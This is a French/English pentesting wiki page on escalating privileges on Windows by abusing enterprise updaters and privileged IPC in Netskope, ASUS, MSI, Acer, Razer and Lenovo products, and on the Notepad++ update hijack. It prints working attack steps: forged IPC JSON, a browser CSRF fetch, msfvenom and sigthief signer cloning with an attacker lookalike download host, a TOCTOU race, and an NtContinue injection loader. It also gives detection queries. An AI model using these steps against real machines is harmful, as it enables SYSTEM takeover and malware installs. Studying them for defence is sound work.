# Abusing Enterprise Auto-Updaters and Privileged IPC (e.g., Netskope, ASUS & MSI)

{{#include ../../banners/hacktricks-training.md}}

Cette page généralise une classe de chaînes de Windows local privilege escalation trouvées dans des agents endpoint d’entreprise et des updaters qui exposent une surface IPC à faible friction et un flux de mise à jour privilégié. Un exemple représentatif est Netskope Client for Windows < R129 (CVE-2025-0309), où un utilisateur low-privileged peut forcer l’enrollment vers un serveur contrôlé par l’attaquant, puis livrer un MSI malveillant que le service SYSTEM installe.

Idées clés que vous pouvez réutiliser contre des produits similaires :
- Abuser de l’IPC localhost d’un service privilégié pour forcer le ré-enrollment ou la reconfiguration vers un serveur attaquant.
- Implémenter les endpoints de mise à jour du vendor, livrer une Rogue Trusted Root CA, et pointer l’updater vers un package malveillant, “signed”.
- Contourner des vérifications faibles de signer (CN allow-lists), des flags de digest optionnels, et des propriétés MSI laxistes.
- Si l’IPC est “encrypted”, dériver la clé/l’IV à partir d’identifiants machine lisibles par tous stockés dans le registry.
- Si le service restreint les appelants par image path/process name, injecter dans un processus allow-listed ou en lancer un en mode suspended et amorcer votre DLL via un patch minimal du thread context.

---
## 1) Forcing enrollment to an attacker server via localhost IPC

De nombreux agents embarquent un processus UI en user-mode qui communique avec un service SYSTEM via localhost TCP en utilisant JSON.

Observé dans Netskope :
- UI: stAgentUI (low integrity) ↔ Service: stAgentSvc (SYSTEM)
- IPC command ID 148: IDP_USER_PROVISIONING_WITH_TOKEN

Flux d’exploitation :
1) Forgez un token d’enrollment JWT dont les claims contrôlent l’hôte backend (par ex., AddonUrl). Utilisez alg=None afin qu’aucune signature ne soit requise.
2) Envoyez le message IPC invoquant la commande de provisioning avec votre JWT et le nom du tenant :
```json
{
"148": {
"idpTokenValue": "<JWT with AddonUrl=attacker-host; header alg=None>",
"tenantName": "TestOrg"
}
}
```
3) Le service commence à contacter votre rogue server pour l’enrollment/config, par exemple :
- /v1/externalhost?service=enrollment
- /config/user/getbrandingbyemail

Notes :
- Si la vérification de l’appelant est basée sur le chemin/le nom, lancez la requête depuis un binaire vendor en allow-list (voir §4).

---
## 2) Hijacking the update channel to run code as SYSTEM

Une fois que le client parle à votre serveur, implémentez les endpoints attendus et orientez-le vers un MSI attacker. Séquence typique :

1) /v2/config/org/clientconfig → Retournez une config JSON avec un intervalle d’updater très court, par exemple :
```json
{
"clientUpdate": { "updateIntervalInMin": 1 },
"check_msi_digest": false
}
```
2) /config/ca/cert → Retourne un certificat CA PEM. Le service l’installe dans le magasin Local Machine Trusted Root.
3) /v2/checkupdate → Fournit des métadonnées pointant vers un MSI malveillant et une fausse version.

Bypassing common checks seen in the wild:
- Signer CN allow-list: le service peut seulement vérifier que le Subject CN est égal à “netSkope Inc” ou “Netskope, Inc.”. Votre rogue CA peut émettre un leaf avec ce CN et signer le MSI.
- CERT_DIGEST property: inclure une propriété MSI bénigne nommée CERT_DIGEST. Aucune enforcement à l’installation.
- Optional digest enforcement: un flag de config (par ex. check_msi_digest=false) désactive la validation cryptographique supplémentaire.

Result: le service SYSTEM installe votre MSI depuis
C:\ProgramData\Netskope\stAgent\data\*.msi
exécutant du code arbitraire en tant que NT AUTHORITY\SYSTEM.

Patch-bypass lesson: si un vendor répond en allow-listant un petit ensemble de domaines “trusted” au lieu d’authentifier cryptographiquement la source de mise à jour, cherchez des redirecteurs appartenant au vendor ou des reverse proxies qui vous permettent quand même de piloter le trafic. Dans le cas de Netskope, des recherches publiques ultérieures ont montré qu’une allow-list de l’époque R129 pouvait encore être abusée via `rproxy.goskope.com`, qui proxiait du contenu Azure App Service contrôlé par l’attaquant. Traitez les hostname allow-lists comme un ralentisseur, pas comme une frontière de confiance.

---
## 3) Forging encrypted IPC requests (when present)

À partir de R127, Netskope enveloppait le JSON IPC dans un champ encryptData qui ressemble à du Base64. La rétro-ingénierie a montré AES avec une clé/IV dérivés de valeurs de registre lisibles par n’importe quel utilisateur :
- Key = HKLM\SOFTWARE\NetSkope\Provisioning\nsdeviceidnew
- IV  = HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProductID

Les attaquants peuvent reproduire le chiffrement et envoyer des commandes chiffrées valides depuis un utilisateur standard. Conseil général : si un agent “chiffre” soudainement son IPC, cherchez des device IDs, des GUID de produit, des install IDs sous HKLM comme matériau.

---
## 4) Bypassing IPC caller allow-lists (path/name checks)

Certains services essaient d’authentifier le peer en résolvant le PID de la connexion TCP et en comparant le chemin/nom de l’image à des binaires vendor allow-listed situés sous Program Files (par ex. stagentui.exe, bwansvc.exe, epdlp.exe).

Deux bypasses pratiques :
- DLL injection dans un processus allow-listed (par ex. nsdiag.exe) et proxy IPC depuis l’intérieur.
- Lancer un binaire allow-listed en suspended et amorcer votre DLL proxy sans CreateRemoteThread (voir §5) pour satisfaire les règles de tamper imposées par le driver.

---
## 5) Tamper-protection friendly injection: suspended process + NtContinue patch

Les produits fournissent souvent un driver minifilter/OB callbacks (par ex. Stadrv) pour retirer les droits dangereux des handles vers les processus protégés :
- Process: enlève PROCESS_TERMINATE, PROCESS_CREATE_THREAD, PROCESS_VM_READ, PROCESS_DUP_HANDLE, PROCESS_SUSPEND_RESUME
- Thread: limite à THREAD_GET_CONTEXT, THREAD_QUERY_LIMITED_INFORMATION, THREAD_RESUME, SYNCHRONIZE

Un loader user-mode fiable qui respecte ces contraintes :
1) CreateProcess d’un binaire vendor avec CREATE_SUSPENDED.
2) Obtenir les handles auxquels vous avez encore droit : PROCESS_VM_WRITE | PROCESS_VM_OPERATION sur le processus, et un thread handle avec THREAD_GET_CONTEXT/THREAD_SET_CONTEXT (ou juste THREAD_RESUME si vous patchiez du code à un RIP connu).
3) Écraser ntdll!NtContinue (ou un autre thunk précoce, garanti mappé) avec un petit stub qui appelle LoadLibraryW sur le chemin de votre DLL, puis reboucle.
4) ResumeThread pour déclencher votre stub dans le processus, chargeant votre DLL.

Comme vous n’avez jamais utilisé PROCESS_CREATE_THREAD ou PROCESS_SUSPEND_RESUME sur un processus déjà protégé (vous l’avez créé), la policy du driver est respectée.

---
## 6) Practical tooling
- NachoVPN (Netskope plugin) automatise une rogue CA, la signature d’un MSI malveillant, et sert les endpoints nécessaires : /v2/config/org/clientconfig, /config/ca/cert, /v2/checkupdate.
- UpSkope est un client IPC personnalisé qui forge des messages IPC arbitraires (optionnellement chiffrés AES) et inclut l’injection de processus suspended pour provenir d’un binaire allow-listed.

## 7) Fast triage workflow for unknown updater/IPC surfaces

Lorsqu’on fait face à un nouvel agent endpoint ou à une suite “helper” de carte mère, un workflow rapide suffit généralement à déterminer si vous avez affaire à une cible privesc prometteuse :

1) Énumérer les écouteurs loopback et les relier aux processus vendor :
```powershell
Get-NetTCPConnection -State Listen |
Where-Object {$_.LocalAddress -in @('127.0.0.1', '::1', '0.0.0.0', '::')} |
Select-Object LocalAddress,LocalPort,OwningProcess,
@{n='Process';e={(Get-Process -Id $_.OwningProcess -ErrorAction SilentlyContinue).Path}}
```
2) Énumérez les named pipes candidates :
```powershell
[System.IO.Directory]::GetFiles("\\.\pipe\") | Select-String -Pattern 'asus|msi|razer|acer|agent|update'
```
3) Extraire les données de routage basées sur le registre utilisées par les serveurs IPC basés sur des plugins:
```powershell
Get-ChildItem 'HKLM:\SOFTWARE\WOW6432Node\MSI\MSI Center\Component' |
Select-Object PSChildName
```
4) Extraire d’abord les noms des endpoints, les clés JSON et les IDs de commande depuis le client en user-mode. Les frontends Electron/.NET packés divulguent fréquemment le schéma complet :
```powershell
Select-String -Path 'C:\Program Files\Vendor\**\*.js','C:\Program Files\Vendor\**\*.dll' `
-Pattern '127.0.0.1|localhost|UpdateApp|checkupdate|NamedPipe|LaunchProcess|Origin'
```
5) Cherchez le prédicat de confiance réel, pas seulement le chemin de code qui lance finalement le processus :
```powershell
Select-String -Path 'C:\Program Files\Vendor\**\*.exe','C:\Program Files\Vendor\**\*.dll','C:\Program Files\Vendor\**\*.js' `
-Pattern 'WinVerifyTrust|CryptQueryObject|Origin|Referer|Subject|CN=|ExecuteTask|LaunchProcess|CreateProcessAsUser'
```
Patterns worth prioritizing :
- `CryptQueryObject`/certificate parsing without `WinVerifyTrust` usually means “certificate exists” was treated as “certificate is trusted”, enabling certificate cloning or other fake-signer tricks.
- Substring/suffix checks over `Origin`, `Referer`, download URLs, process names, or signer CNs are not authentication. `contains(".vendor.com")` is usually exploitable with attacker-controlled lookalike domains.
- If the low-privileged GUI decides “the file is trusted” and the SYSTEM broker merely consumes that result, patching or reimplementing the client-side DLL/JS often bypasses the boundary entirely (Razer-style split validation).
- If the broker copies a payload to `%TEMP%`/`C:\Windows\Temp` and then validates or schedules it from that path, immediately test for TOCTOU replacement windows and for sibling plugin modules that expose alternate `ExecuteTask()` wrappers with weaker checks.

For named-pipe-heavy targets, PipeViewer is a quick way to spot weak DACLs and remotely reachable pipes before you start reversing the protocol in depth.

If the target authenticates callers only by PID, image path, or process name, treat that as a speed bump rather than a boundary: injecting into the legitimate client, or making the connection from an allow-listed process, is often enough to satisfy the server’s checks. For named pipes specifically, [this page about client impersonation and pipe abuse](named-pipe-client-impersonation.md) covers the primitive in more depth.

---
## 8) Modular add-in brokers authenticated only by vendor signatures (Lenovo Vantage pattern)

A newer variation worth hunting is the **signed-client RPC broker**: a low-privileged Lenovo-signed desktop process talks to a SYSTEM service, and the service routes JSON commands into a set of XML-described add-ins under `%ProgramData%`. Once code execution is achieved **inside any accepted signed client**, every `runas="system"` contract becomes part of your attack surface.

High-value primitives observed in Lenovo Vantage research:
- **Trusting the caller because it is signed by the vendor**: researchers reached an authenticated context by copying a Lenovo-signed EXE to a writable directory and satisfying a DLL side-load (`profapi.dll`) so arbitrary code ran inside a client the service already trusted.
- **Manifest-driven attack surface discovery**: add-ins are declared under `C:\ProgramData\Lenovo\Vantage\Addins\*.xml`; several contracts run as `SYSTEM`, so enumerating those manifests often reveals the real privileged verbs faster than reversing the broker itself.
- **Per-command bugs behind the authenticated channel**: once inside the trusted client, public research found path-traversal + race conditions in update/install verbs, raw-SQL abuse in privileged settings databases, and substring-based registry path checks that enabled writes outside the intended hive.

Useful recon on a target:
```powershell
Get-ChildItem "$env:ProgramData\Lenovo\Vantage\Addins" -Filter *.xml |
Select-String -Pattern 'runas="system"|<name>|<namespace>'
```

```powershell
Select-String -Path 'C:\Program Files\Lenovo\**\*.dll','C:\Program Files\Lenovo\**\*.exe' `
-Pattern 'contract|command|payload|DeleteTable|DeleteSetting|Set-KeyChildren|DownloadAndInstallAppComponent|InstallOnly'
```
Conseil pratique : chaque fois qu’une suite d’assistance expose un broker qui authentifie d’abord le **caller process** puis seulement ensuite dispatch vers des dizaines de commandes plugin/add-in, ne vous arrêtez pas après avoir contourné le contrôle de confiance de la porte d’entrée. Dump la table manifest/contract et fuzz chaque verbe à haute privilège indépendamment ; le canal authentifié cache généralement plusieurs bugs de second stage.

---
## 1) CSRF de browser vers localhost contre des API HTTP privilégiées (ASUS DriverHub)

DriverHub embarque un service HTTP en user-mode (ADU.exe) sur 127.0.0.1:53000 qui attend des appels browser venant de https://driverhub.asus.com. Le filtre d’origine effectue simplement `string_contains(".asus.com")` sur l’en-tête Origin et sur les download URLs exposées par `/asus/v1.0/*`. Tout host contrôlé par l’attaquant comme `https://driverhub.asus.com.attacker.tld` passe donc la vérification et peut émettre des requêtes modifiant l’état depuis JavaScript. Voir [CSRF basics](../../pentesting-web/csrf-cross-site-request-forgery.md) pour d’autres patterns de bypass.

Flux pratique :
1) Enregistrez un domaine qui embarque `.asus.com` et hébergez-y une page web malveillante.
2) Utilisez `fetch` ou XHR pour appeler un endpoint privilégié (par ex., `Reboot`, `UpdateApp`) sur `http://127.0.0.1:53000`.
3) Envoyez le corps JSON attendu par le handler – le JS frontend packé montre le schéma ci-dessous.
```javascript
fetch("http://127.0.0.1:53000/asus/v1.0/Reboot", {
method: "POST",
headers: { "Content-Type": "application/json" },
body: JSON.stringify({ Event: [{ Cmd: "Reboot" }] })
});
```
Même l’interface CLI PowerShell montrée ci-dessous réussit lorsque l’en-tête Origin est usurpé vers la valeur de confiance :
```powershell
Invoke-WebRequest -Uri "http://127.0.0.1:53000/asus/v1.0/Reboot" -Method Post \
-Headers @{Origin="https://driverhub.asus.com"; "Content-Type"="application/json"} \
-Body (@{Event=@(@{Cmd="Reboot"})}|ConvertTo-Json)
```
Any browser visit to the attacker site therefore becomes a 1-click (or 0-click via `onload`) local CSRF that drives a SYSTEM helper.

---
## 2) Insecure code-signing verification & certificate cloning (ASUS UpdateApp)

`/asus/v1.0/UpdateApp` télécharge des exécutables arbitraires définis dans le corps JSON et les met en cache dans `C:\ProgramData\ASUS\AsusDriverHub\SupportTemp`. La validation de l’URL de téléchargement réutilise la même logique basée sur un sous-texte, donc `http://updates.asus.com.attacker.tld:8000/payload.exe` est acceptée. Après le téléchargement, ADU.exe vérifie seulement que le PE contient une signature et que la chaîne Subject correspond à ASUS avant de l’exécuter – pas de `WinVerifyTrust`, pas de validation de chaîne.

Pour weaponize le flux :
1) Crée un payload (par ex. `msfvenom -p windows/exec CMD=notepad.exe -f exe -o payload.exe`).
2) Clone le signer ASUS dedans (par ex. `python sigthief.py -i ASUS-DriverHub-Installer.exe -t payload.exe -o pwn.exe`).
3) Héberge `pwn.exe` sur un domaine ressemblant à `.asus.com` et déclenche UpdateApp via le browser CSRF ci-dessus.

Comme les filtres Origin et URL sont tous deux basés sur des sous-chaînes et que la vérification du signer compare seulement des chaînes, DriverHub récupère et exécute le binaire de l’attaquant dans son contexte élevé.

---
## 1) TOCTOU inside updater copy/execute paths (MSI Center CMD_AutoUpdateSDK)

Le service SYSTEM de MSI Center expose un protocole TCP où chaque frame est `4-byte ComponentID || 8-byte CommandID || ASCII arguments`. Le composant principal (Component ID `0f 27 00 00`) fournit `CMD_AutoUpdateSDK = {05 03 01 08 FF FF FF FC}`. Son handler :
1) Copie l’exécutable fourni vers `C:\Windows\Temp\MSI Center SDK.exe`.
2) Vérifie la signature via `CS_CommonAPI.EX_CA::Verify` (le sujet du certificat doit être égal à “MICRO-STAR INTERNATIONAL CO., LTD.” et `WinVerifyTrust` doit réussir).
3) Crée une tâche planifiée qui exécute le fichier temporaire en tant que SYSTEM avec des arguments contrôlés par l’attaquant.

Le fichier copié n’est pas verrouillé entre la vérification et `ExecuteTask()`. Un attaquant peut :
- Envoyer le Frame A pointant vers un binaire légitime signé MSI (ce qui garantit que la vérification de signature passe et que la tâche est mise en file d’attente).
- Le rattraper avec des messages Frame B répétés qui pointent vers un payload malveillant, en écrasant `MSI Center SDK.exe` juste après la fin de la vérification.

Quand le scheduler s’exécute, il lance le payload écrasé en tant que SYSTEM malgré la validation du fichier original. Une exploitation fiable utilise deux goroutines/threads qui spamment `CMD_AutoUpdateSDK` jusqu’à gagner la fenêtre TOCTOU.

---
## 2) Abusing custom SYSTEM-level IPC & impersonation (MSI Center + Acer Control Centre)

### MSI Center TCP command sets
- Chaque plugin/DLL chargé par `MSI.CentralServer.exe` reçoit un Component ID stocké sous `HKLM\SOFTWARE\MSI\MSI_CentralServer`. Les 4 premiers octets d’une frame sélectionnent ce composant, ce qui permet aux attaquants de router des commandes vers des modules arbitraires.
- Les plugins peuvent définir leurs propres task runners. `Support\API_Support.dll` expose `CMD_Common_RunAMDVbFlashSetup = {05 03 01 08 01 00 03 03}` et appelle directement `API_Support.EX_Task::ExecuteTask()` sans **aucune** validation de signature – n’importe quel utilisateur local peut lui indiquer `C:\Users\<user>\Desktop\payload.exe` et obtenir une exécution SYSTEM de façon déterministe.
- Sniffer le loopback avec Wireshark ou instrumenter les binaires .NET dans dnSpy révèle rapidement le mapping Component ↔ command ; des clients Go/Python personnalisés peuvent alors rejouer les frames.

### Acer Control Centre named pipes & impersonation levels
- `ACCSvc.exe` (SYSTEM) expose `\\.\pipe\treadstone_service_LightMode`, et son ACL discrétionnaire autorise les clients distants (par ex. `\\TARGET\pipe\treadstone_service_LightMode`). Envoyer la commande ID `7` avec un chemin de fichier invoque la routine de lancement de processus du service.
- La bibliothèque client sérialise un octet terminator magique (113) avec les args. L’instrumentation dynamique avec Frida/`TsDotNetLib` (voir [Reversing Tools & Basic Methods](../../reversing/reversing-tools-basic-methods/README.md) pour des conseils d’instrumentation) montre que le handler natif mappe cette valeur à un `SECURITY_IMPERSONATION_LEVEL` et à un SID d’intégrité avant d’appeler `CreateProcessAsUser`.
- Remplacer 113 (`0x71`) par 114 (`0x72`) fait tomber dans la branche générique qui conserve le jeton SYSTEM complet et définit un SID à haute intégrité (`S-1-16-12288`). Le binaire lancé s’exécute donc comme SYSTEM non restreint, à la fois localement et sur une autre machine.
- Combine cela avec le flag d’installateur exposé (`Setup.exe -nocheck`) pour mettre en place ACC même sur des VM de lab et tester le pipe sans matériel du vendor.

Ces bugs IPC montrent pourquoi les services localhost doivent imposer une authentification mutuelle (SID ALPC, filtres `ImpersonationLevel=Impersonation`, filtrage de jetons) et pourquoi l’aide “run arbitrary binary” de chaque module doit partager les mêmes vérifications de signer.

---
## 3) COM/IPC “elevator” helpers backed by weak user-mode validation (Razer Synapse 4)

Razer Synapse 4 a ajouté un autre pattern utile à cette famille : un utilisateur à faible privilège peut demander à un helper COM de lancer un processus via `RzUtility.Elevator`, tandis que la décision de confiance est déléguée à une DLL en user-mode (`simple_service.dll`) plutôt que d’être appliquée de manière robuste à l’intérieur de la frontière privilégiée.

Chemin d’exploitation observé :
- Instancier l’objet COM `RzUtility.Elevator`.
- Appeler `LaunchProcessNoWait(<path>, "", 1)` pour demander un lancement élevé.
- Dans le PoC public, la porte de validation de signature PE dans `simple_service.dll` est patchée avant l’envoi de la requête, ce qui permet de lancer un exécutable arbitraire choisi par l’attaquant.

Invocation PowerShell minimale :
```powershell
$com = New-Object -ComObject 'RzUtility.Elevator'
$com.LaunchProcessNoWait("C:\Users\Public\payload.exe", "", 1)
```
Idée générale : lors de l’analyse inverse de suites « helper », ne vous arrêtez pas à localhost TCP ou aux named pipes. Cherchez des classes COM avec des noms comme `Elevator`, `Launcher`, `Updater`, ou `Utility`, puis vérifiez si le service privilégié valide réellement le binaire cible lui-même ou s’il fait simplement confiance à un résultat calculé par une DLL client en mode utilisateur patchable. Ce pattern va au-delà de Razer : toute conception scindée où le broker à haut privilège consomme une décision allow/deny provenant de la partie à faible privilège est une surface candidate de privesc.

---
## Détournement à distance de la chaîne d’approvisionnement via une validation faible de l’updater (WinGUp / Notepad++)

Entre juin 2025 et décembre 2025, des attaquants ayant compromis l’infrastructure d’hébergement derrière le flux de mise à jour de Notepad++ ont servi sélectivement des manifests malveillants à des victimes choisies. Les anciens updaters basés sur WinGUp ne vérifiaient pas complètement l’authenticité des mises à jour, donc une réponse XML hostile pouvait rediriger les clients vers des URLs contrôlées par l’attaquant. Comme le client acceptait du contenu HTTPS sans imposer à la fois une chaîne de certificats de confiance et une signature PE valide sur l’installateur téléchargé, les victimes ont récupéré et exécuté un `update.exe` NSIS trojanisé.

Flux opérationnel (aucun exploit local requis) :
1. **Interception de l’infrastructure** : compromettre le CDN/l’hébergement et répondre aux vérifications de mise à jour avec des métadonnées de l’attaquant pointant vers une URL de téléchargement malveillante.
2. **NSIS trojanisé** : l’installateur récupère/exécute une charge utile et abuse de deux chaînes d’exécution :
- **Bring-your-own signed binary + sideload** : empaqueter le Bitdefender signé `BluetoothService.exe` et déposer une DLL malveillante `log.dll` dans son chemin de recherche. Quand le binaire signé s’exécute, Windows sideload `log.dll`, qui déchiffre et charge de façon reflective le backdoor Chrysalis (protégé par Warbird + API hashing pour gêner la détection statique).
- **Injection de shellcode par script** : NSIS exécute un script Lua compilé qui utilise des APIs Win32 (par ex. `EnumWindowStationsW`) pour injecter du shellcode et préparer Cobalt Strike Beacon.

Points clés de durcissement/détection pour tout auto-updater :
- Imposer la **vérification du certificat + de la signature** de l’installateur téléchargé (pinner le signer du vendor, rejeter les CN/chaînes non concordants) et signer le manifest de mise à jour lui-même (par ex. XMLDSig). Bloquer les redirects pilotés par le manifest sauf validation.
- Traiter le **sideloading via BYO signed binary** comme un pivot de détection post-téléchargement : alerter lorsqu’un EXE signé du vendor charge un nom de DLL depuis un chemin en dehors de son chemin d’installation canonique (par ex. Bitdefender chargeant `log.dll` depuis Temp/Downloads) et lorsqu’un updater dépose/exécute des installateurs depuis temp avec des signatures non-vendor.
- Surveiller les **artefacts spécifiques au malware** observés dans cette chaîne (utiles comme pivots génériques) : mutex `Global\Jdhfv_1.0.1`, écritures anormales de `gup.exe` vers `%TEMP%`, et étapes d’injection de shellcode pilotées par Lua.
- Notepad++ a réagi en renforçant WinGUp dans la v8.8.9 et les versions ultérieures : le XML renvoyé est désormais signé (XMLDSig), et les builds plus récents imposent la vérification du certificat + de la signature de l’installateur téléchargé au lieu de faire confiance au transport seul.

<details>
<summary>Cortex XDR XQL – sideloading d’un EXE signé Bitdefender de <code>log.dll</code> (T1574.001)</summary>
```sql
// Identifies Bitdefender-signed processes loading log.dll outside vendor paths
config case_sensitive = false
| dataset = xdr_data
| fields actor_process_signature_vendor, actor_process_signature_product, action_module_path, actor_process_image_path, actor_process_image_sha256, agent_os_type, event_type, event_id, agent_hostname, _time, actor_process_image_name
| filter event_type = ENUM.LOAD_IMAGE and agent_os_type = ENUM.AGENT_OS_WINDOWS
| filter actor_process_signature_vendor contains "Bitdefender SRL" and action_module_path contains "log.dll"
| filter actor_process_image_path not contains "Program Files\\Bitdefender"
| filter not actor_process_image_name in ("eps.rmm64.exe", "downloader.exe", "installer.exe", "epconsole.exe", "EPHost.exe", "epintegrationservice.exe", "EPPowerConsole.exe", "epprotectedservice.exe", "DiscoverySrv.exe", "epsecurityservice.exe", "EPSecurityService.exe", "epupdateservice.exe", "testinitsigs.exe", "EPHost.Integrity.exe", "WatchDog.exe", "ProductAgentService.exe", "EPLowPrivilegeWorker.exe", "Product.Configuration.Tool.exe", "eps.rmm.exe")
```
</details>

<details>
<summary>Cortex XDR XQL – <code>gup.exe</code> lançant un installateur autre que Notepad++</summary>
```sql
config case_sensitive = false
| dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START and _product = "XDR agent" and _vendor = "PANW"
| filter lowercase(actor_process_image_name) = "gup.exe" and actor_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN ) and action_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN )
| filter lowercase(action_process_image_name) ~= "(npp[\.\d]+?installer)"
| filter action_process_signature_status != ENUM.SIGNED or lowercase(action_process_signature_vendor) != "notepad++"
```
</details>

Ces schémas s’appliquent à tout updater qui accepte des manifests non signés ou ne verrouille pas les signers de l’installateur — network hijack + malicious installer + BYO-signed sideloading permet une remote code execution sous couvert de mises à jour « trusted ».

---
## References
- [Advisory – Netskope Client for Windows – Local Privilege Escalation via Rogue Server (CVE-2025-0309)](https://blog.amberwolf.com/blog/2025/august/advisory---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [Netskope Security Advisory NSKPSA-2025-002](https://www.netskope.com/resources/netskope-resources/netskope-security-advisory-nskpsa-2025-002)
- [NachoVPN – Netskope plugin](https://github.com/AmberWolfCyber/NachoVPN)
- [UpSkope – Netskope IPC client/exploit](https://github.com/AmberWolfCyber/UpSkope)
- [NVD – CVE-2025-0309](https://nvd.nist.gov/vuln/detail/CVE-2025-0309)
- [SensePost – Pwning ASUS DriverHub, MSI Center, Acer Control Centre and Razer Synapse 4](https://sensepost.com/blog/2025/pwning-asus-driverhub-msi-center-acer-control-centre-and-razer-synapse-4/)
- [sensepost/bloatware-pwn PoCs](https://github.com/sensepost/bloatware-pwn)
- [CyberArk PipeViewer](https://github.com/cyberark/PipeViewer)
- [Unit 42 – Nation-State Actors Exploit Notepad++ Supply Chain](https://unit42.paloaltonetworks.com/notepad-infrastructure-compromise/)
- [Notepad++ – hijacked infrastructure incident update](https://notepad-plus-plus.org/news/hijacked-incident-info-update/)
- [AmberWolf – Bypassing the fix for CVE-2025-0309 in Netskope Client for Windows](https://blog.amberwolf.com/blog/2026/march/patch-bypass---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [Atredis – Uncovering Privilege Escalation Bugs in Lenovo Vantage](https://www.atredis.com/blog/2025/7/7/uncovering-privilege-escalation-bugs-in-lenovo-vantage)

{{#include ../../banners/hacktricks-training.md}}
